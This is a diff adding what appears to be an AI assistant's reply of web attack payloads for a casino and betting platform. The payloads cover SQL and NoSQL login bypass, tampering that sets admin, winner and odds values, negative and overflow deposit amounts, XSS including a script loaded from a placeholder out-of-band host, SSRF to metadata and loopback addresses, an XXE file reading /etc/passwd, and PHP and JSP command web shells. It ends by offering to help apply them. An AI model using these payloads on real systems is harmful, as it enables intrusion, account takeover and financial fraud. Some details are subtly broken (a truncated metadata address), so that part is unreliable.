@@ -1,0 +1,108 @@
+Here are standard, generic payload templates structured for each testing phase. Use them responsibly within your isolated test accounts to identify input handling issues.
+------------------------------
+## 1️⃣ Area 1: Authentication & Account Management## Step 1: SQL & NoSQL Injection (Login/Registration)
+
+* SQL Injection (Auth Bypass):
+
+' OR 1=1--
+
+admin' --
+
+* NoSQL Injection (JSON/MongoDB Auth Bypass):
+Change the standard JSON body from {"username": "user", "password": "password"} to:
+
+{
+  "username": {"$ne": "invalid_user_here"},
+  "password": {"$ne": "invalid_password_here"}
+}
+
+
+## Step 3: OAuth/Response Parameter Tampering
+When intercepting responses or callback tokens, look for and replace state indicators:
+
+* JSON State Override:
+
+{"success":true,"role":"admin","authenticated":true}
+
+
+------------------------------
+## 2️⃣ Area 2: Financial Operations## Step 1 & 3: Parameter Tampering & Negative Values
+When intercepting deposit or withdrawal API bodies, swap numerical variables to check for validation flaws:
+
+* Fractional Tampering: amount=0.01
+* Negative Integer Injection: amount=-100.00
+* Large Integer/Overflow (If bounds checking is absent): amount=999999999
+* Array-based Parameter Pollution (JSON format):
+
+{"amount": ["100.00", "0.01"]}
+
+
+------------------------------
+## 3️⃣ Area 3: Casino & Betting Core Features## Step 2: WebSocket Manipulation (JSON State States)
+If intercepting live betting packets over WebSockets or HTTP streams, search for game attributes to manipulate:
+
+* Odds/Multiplier Manipulation: "odds": 99.0 or "multiplier": 100
+* State Enforcement: "game_state": "win" or "is_winner": true
+
+## Step 3: Stored / Blind XSS
+Input these into profile settings, nicknames, or support text forms to verify context escaping:
+
+* Standard HTML Injection:
+
+<script>alert(document.domain)</script>
+
+* Attribute Breakout (For input box tags):
+
+" onfocus="alert(1)" autofocus="
+
+* Out-of-Band Blind XSS (Using your Burp Collaborator or Interactsh address):
+
+"><script src="http://YOUR_OAST_DOMAIN"></script>
+
+
+------------------------------
+## 4️⃣ Area 4: Infrastructure & Input Handling## Step 1: Server-Side Request Forgery (SSRF)
+When an input field requests a remote image URL, avatar, or link, submit internal metadata or loopback paths:
+
+* Cloud Metadata Endpoint (AWS/OpenStack):
+
+http://169.254.169
+
+* Local Loopback Port Scanning:
+
+http://127.0.0.1:8080
+
+http://localhost:3000
+
+
+## Step 2: XML External Entity (XXE) Injection
+If uploading document structures (such as .svg image files or .xml configurations), save the text below with an .svg extension to test for local file visibility:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [  
+  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<svg width="100" height="100" xmlns="http://w3.org">
+  <text x="10" y="20" font-size="10">&xxe;</text>
+</svg>
+
+(Windows backend variant entry: file:///c:/windows/win.ini)
+## Step 3: Remote Code Execution (RCE) Web Shells
+If an application contains a file upload vulnerability that executes server-side code without verification, standard minimal shells include:
+
+* PHP Environment Template:
+
+<?php echo system($_GET['cmd']); ?>
+
+* JSP (Java) Environment Template:
+
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+
+------------------------------
+If you are ready to apply these templates to your target environment setup, let me know:
+
+* Which vulnerability category you want to focus on validating first.
+* If you need help troubleshooting an unexpected error response code (e.g., 400 Bad Request or 403 Forbidden) when trying these payloads.
+
+
